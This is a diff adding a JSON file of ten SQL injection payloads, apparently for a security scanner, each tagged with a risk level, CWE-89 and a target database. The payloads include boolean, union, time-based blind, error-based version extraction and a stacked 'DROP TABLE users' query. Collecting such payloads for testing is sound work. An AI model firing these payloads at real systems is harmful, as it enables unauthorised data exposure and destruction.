@@ -1,0 +1,84 @@
+{
+  "sqli": [
+    {
+      "name": "Basic SQL Injection",
+      "payload": "' OR 1=1--",
+      "description": "Basic boolean-based SQL injection",
+      "risk": "high",
+      "cwe": "CWE-89",
+      "database": "generic"
+    },
+    {
+      "name": "Union-based SQL Injection",
+      "payload": "' UNION SELECT NULL--",
+      "description": "Union-based SQL injection",
+      "risk": "high",
+      "cwe": "CWE-89",
+      "database": "generic"
+    },
+    {
+      "name": "Time-based SQL Injection",
+      "payload": "'; WAITFOR DELAY '00:00:05'--",
+      "description": "Time-based blind SQL injection",
+      "risk": "high",
+      "cwe": "CWE-89",
+      "database": "mssql"
+    },
+    {
+      "name": "MySQL Time-based",
+      "payload": "'; SLEEP(5)--",
+      "description": "MySQL time-based blind SQL injection",
+      "risk": "high",
+      "cwe": "CWE-89",
+      "database": "mysql"
+    },
+    {
+      "name": "PostgreSQL Time-based",
+      "payload": "'; pg_sleep(5)--",
+      "description": "PostgreSQL time-based blind SQL injection",
+      "risk": "high",
+      "cwe": "CWE-89",
+      "database": "postgresql"
+    },
+    {
+      "name": "Error-based SQL Injection",
+      "payload": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(SELECT version()),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
+      "description": "Error-based SQL injection",
+      "risk": "high",
+      "cwe": "CWE-89",
+      "database": "mysql"
+    },
+    {
+      "name": "Stacked Queries",
+      "payload": "'; DROP TABLE users--",
+      "description": "Stacked queries SQL injection",
+      "risk": "critical",
+      "cwe": "CWE-89",
+      "database": "generic"
+    },
+    {
+      "name": "Boolean-based Blind",
+      "payload": "' AND 1=1--",
+      "description": "Boolean-based blind SQL injection",
+      "risk": "high",
+      "cwe": "CWE-89",
+      "database": "generic"
+    },
+    {
+      "name": "Oracle Time-based",
+      "payload": "' AND (SELECT COUNT(*) FROM ALL_TABLES WHERE ROWNUM=1 AND DBMS_PIPE.RECEIVE_MESSAGE(('A'||'A'||'A'),5)>0)--",
+      "description": "Oracle time-based blind SQL injection",
+      "risk": "high",
+      "cwe": "CWE-89",
+      "database": "oracle"
+    },
+    {
+      "name": "SQLite Time-based",
+      "payload": "' AND (SELECT COUNT(*) FROM sqlite_master WHERE ROWID=1 AND RANDOMBLOB(5000000)>0)--",
+      "description": "SQLite time-based blind SQL injection",
+      "risk": "high",
+      "cwe": "CWE-89",
+      "database": "sqlite"
+    }
+  ]
+} 
